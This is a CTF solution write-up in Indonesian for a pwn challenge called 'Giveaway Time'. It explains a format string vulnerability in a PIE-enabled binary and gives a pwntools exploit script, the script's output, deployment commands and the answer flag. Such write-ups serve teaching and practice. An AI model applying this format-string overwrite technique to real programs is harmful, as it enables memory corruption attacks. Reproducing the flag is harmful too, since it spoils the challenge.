# Giveaway Time (100 Pts)

## Deskripsi
Coba keberuntunganmu dengan mengikuti giveaway ini.

Author : Inlandsche

## Hint 
Tidak ada

## Proof of Concept
Pertama, lakukan analisa kode program dengan menggunakan software disassambler (`ghidra/IDA`) atau dengan `gdb`.
Program memiliki kelemahan pada fungsi `printf(address)` atau biasa disebut dengan **format string vulnerability**. 

Pada program ini, terdapat proteksi dengan menggunakan **PIE** sehingga peserta harus mencari **base address** terlebih dahulu. Program telah mengeluarkan output berupa **id registrasi** yang dapat digunakan untuk mencari base address.

`base_address = int(id_registrasi) - int(registration_address)`

Setelah mendapat base address, eksekusi program dengan menggunakan **format string attack**. Peserta harus melakukan overwrite suatu variabel global dengan nama variabel `prize`.

Contoh script sederhana

```python3
from pwn import *

elf = ELF('./giveaway')

prize = elf.symbols['prize']
registration = elf.symbols['registration']

p = elf.process()
p.sendline("Hology4.0")

p.recvuntil("This is your registration id, ")
regist = int(p.recv(10), 0)

base = regist - registration
prizes = prize + base

payload = p32(prizes) + b"%4$n"

p.sendline(payload)
p.interactive()
```

Output dari script tersebut

```
[*] '/home/inlandsche/CySec/Hology Soal/fix/giveaway'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/inlandsche/CySec/Hology Soal/fix/giveaway': pid 4818
/home/inlandsche/CySec/Hology Soal/fix/sc.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("Hology4.0")
/home/inlandsche/CySec/Hology Soal/fix/sc.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("This is your registration id, ")
[*] Switching to interactive mode
 
Please do the registration to get the prize
Your Address: Your Address is, 0\xe0_V
You win this!


hology4{f0rm4T_5tRing_Giv3aw4y}
[*] Process '/home/inlandsche/CySec/Hology Soal/fix/giveaway' stopped with exit code 0 (pid 4818)
[*] Got EOF while reading in interactive
```

## Referensi
Tidak ada

## Deployment

```
#docker build -t giveaway
#docker run -d --name=giveaway -p 31420:31420/tcp giveaway
#crontab /path/to/crontab

tcpserver -t 30 -RHl0 -v 0.0.0.0 9999 ./giveaway 
```

## Flag
<details>
<summary>Tekan untuk melihat flag</summary>

    hology4{f0rm4T_5tRing_Giv3aw4y}

</details>